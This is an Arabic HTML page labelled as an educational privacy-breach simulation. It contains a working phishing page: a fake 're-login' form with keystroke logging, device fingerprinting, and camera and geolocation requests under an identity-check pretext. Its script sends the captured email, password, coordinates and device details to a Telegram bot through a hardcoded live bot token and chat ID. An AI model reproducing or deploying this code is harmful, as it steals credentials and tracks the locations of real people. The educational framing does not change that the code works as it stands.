<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>🚨 مختبر الوعي الأمني - العرض العملي الشامل</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { border: 2px solid #333; padding: 20px; border-radius: 10px; background: #000; position: relative; }
        .danger-border { border-color: #ff0000; box-shadow: 0 0 15px rgba(255, 0, 0, 0.3); }
        h2 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; }
        button { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        button:hover { background: #aa0000; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #333; border-radius: 5px; }
        #console { height: 400px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; border: 1px solid #111; }
        .tag { position: absolute; top: 10px; left: 10px; font-size: 10px; background: #333; padding: 2px 5px; border-radius: 3px; }
    </style>
</head>
<body>

    <h1 style="text-align: center; color: #ff0000;">🛡️ محاكاة اختراق الخصوصية (لأغراض تعليمية)</h1>

    <div class="grid">
        <div class="box">
            <span class="tag">VIEW: VICTIM</span>
            <h2>📱 واجهة المستخدم</h2>
            <div style="background: #151515; padding: 20px; border-radius: 10px;">
                <p style="color: #ffcc00;">⚠️ تم تسجيل الخروج! يرجى إعادة إدخال البيانات للمتابعة:</p>
                <input type="text" id="email" placeholder="البريد الإلكتروني" oninput="logKey(this.value, 'User')">
                <input type="password" id="pass" placeholder="كلمة المرور" oninput="logKey(this.value, 'Pass')">
                <button onclick="launchAttack()">تحديث وتأمين الدخول 🔐</button>
            </div>
            <p style="font-size: 11px; color: #555; margin-top: 15px;">* عند الضغط، سيطلب الموقع أذونات (كاميرا وموقع) تحت مسمى "التحقق من الهوية".</p>
        </div>

        <div class="box danger-border">
            <span class="tag" style="background: #ff0000;">VIEW: ATTACKER</span>
            <h2 style="color: #ff0000;">💀 لوحة التحكم (Live)</h2>
            <div id="console">> بانتظار تفاعل الهدف...</div>
        </div>
    </div>

<script>
    // بيانات التلجرام الخاصة بك
    const BOT_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
    const CHAT_ID = "8146130042";
    const consoleDiv = document.getElementById('console');

    function writeLog(msg, color = "#00ff41") {
        consoleDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        consoleDiv.scrollTop = consoleDiv.scrollHeight;
    }

    // 1. بصمة الجهاز (صامتة عند التحميل)
    window.onload = () => {
        writeLog("🚨 ضحية جديد متصل حالياً.");
        writeLog(`📡 النظام: ${navigator.platform} | المتصفح: ${navigator.userAgent.split(' ')[0]}`);
        writeLog(`🌍 اللغة: ${navigator.language} | الدقة: ${window.screen.width}x${window.screen.height}`);
    };

    // 2. رصد المفاتيح (Keylogging)
    function logKey(val, type) {
        writeLog(`⌨️ [LIVE] ${type}: ${val}`, "#ffcc00");
    }

    // 3. الهجوم الشامل والإرسال للتلجرام
    async function launchAttack() {
        writeLog("🧨 تم تفعيل الهجوم الشامل (Full Infiltration)...", "#ff0000");

        try {
            // طلب الكاميرا والموقع
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            writeLog("✅ تم اختراق الكاميرا بنجاح!", "#ff0000");

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                writeLog(`📍 تم سحب الإحداثيات: ${lat}, ${lon}`, "#ff0000");

                // تجميع البيانات المسروقة
                const userData = document.getElementById('email').value;
                const passData = document.getElementById('pass').value;
                
                const report = `🚨 *تقرير اختراق جديد* 🚨\n\n` +
                               `📧 الحساب: \`${userData}\`\n` +
                               `🔑 الباسورد: \`${passData}\`\n` +
                               `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
                               `📱 الجهاز: ${navigator.platform}\n` +
                               `🌐 المتصفح: ${navigator.userAgent.substring(0, 50)}...`;

                writeLog("📡 جاري شحن البيانات إلى سيرفر التلجرام...");

                // عملية الإرسال الحقيقية
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    writeLog("🔥 تم استلام البيانات على هاتف المهاجم بنجاح!", "#ff0000");
                } else {
                    writeLog("⚠️ فشل الإرسال (تأكد من الـ Token والأيدي).", "#fff");
                }

                // إغلاق الكاميرا بعد انتهاء المهمة
                stream.getTracks().forEach(track => track.stop());
            });

        } catch (err) {
            writeLog("❌ الضحية رفض الأذونات. الهجوم فشل في سحب الكاميرا والموقع.", "#fff");
        }
    }
</script>
</body>
</html>
